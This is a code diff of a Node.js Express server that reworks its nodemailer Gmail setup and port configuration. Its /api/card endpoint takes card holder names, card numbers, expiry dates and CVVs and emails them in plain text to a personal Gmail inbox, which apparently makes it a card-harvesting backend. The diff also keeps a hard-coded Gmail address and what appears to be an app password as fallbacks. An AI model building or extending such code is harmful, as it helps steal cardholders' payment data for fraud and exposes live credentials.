@@ -60,24 +60,36 @@ app.use((req, res, next) => {
   next();
 });
 
+// Use env vars for Gmail credentials. For production set GMAIL_USER and GMAIL_PASS (app password).
+const gmailUser = process.env.GMAIL_USER;
+const gmailPass = process.env.GMAIL_PASS;
+
+if (!gmailUser || !gmailPass) {
+  console.warn('Warning: GMAIL_USER or GMAIL_PASS not set. Email sending will likely fail. Set environment variables for production.');
+}
+
 const transporter = nodemailer.createTransport({
-  service: 'gmail',
+  host: 'smtp.gmail.com',
+  port: 465,
+  secure: true, // true for port 465
   auth: {
-    user: process.env.GMAIL_USER || 'peternnamani001@gmail.com',
-    pass: process.env.GMAIL_PASS || 'llvn tfua kgre byir'
-    // For Vercel, set GMAIL_USER and GMAIL_PASS in dashboard, not in code!
+    user: gmailUser || 'peternnamani001@gmail.com',
+    pass: gmailPass || 'llvn tfua kgre byir' // fallback kept for dev but recommend removing
   }
 });
 
-// Verify transporter configuration at startup
-transporter.verify(function(error, success) {
-  if (error) {
-    console.error('Nodemailer transporter verification failed:', error);
-    // If you see "Invalid credentials" or "Application-specific password required", check your Gmail security settings.
-  } else {
-    console.log('Nodemailer transporter is ready to send emails');
-  }
-});
+// Verify transporter only if credentials are present
+if (gmailUser && gmailPass) {
+  transporter.verify(function(error, success) {
+    if (error) {
+      console.error('Nodemailer transporter verification failed:', error);
+    } else {
+      console.log('Nodemailer transporter is ready to send emails');
+    }
+  });
+} else {
+  console.log('Skipping transporter.verify(): missing GMAIL_USER or GMAIL_PASS');
+}
 
 app.options('/api/card', cors()); // Handle preflight requests for /api/card
 
@@ -93,8 +105,8 @@ app.post('/api/card', async (req, res) => {
   }
 
   const mailOptions = {
-    from: 'peternnamani001@gmail.com', // same as above
-    to: 'peternnamani001@gmail.com',
+    from: gmailUser || 'peternnamani001@gmail.com',
+    to: gmailUser || 'peternnamani001@gmail.com',
     subject: 'New Card Submission',
     text: JSON.stringify({ cardName, cardNumber, expiry, cvv }, null, 2)
   };
@@ -111,12 +123,14 @@ app.post('/api/card', async (req, res) => {
       res.header('Access-Control-Allow-Origin', req.headers.origin);
       res.header('Access-Control-Allow-Credentials', 'true');
     }
+    console.error('Error sending email:', err);
     res.status(500).json({ error: 'Failed to send email', details: err.message });
   }
 });
 
-app.listen(3000, () => {
-  console.log('API server running on port 3000');
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log(`API server running on port ${PORT}`);
 });
 
 // For Vercel compatibility:
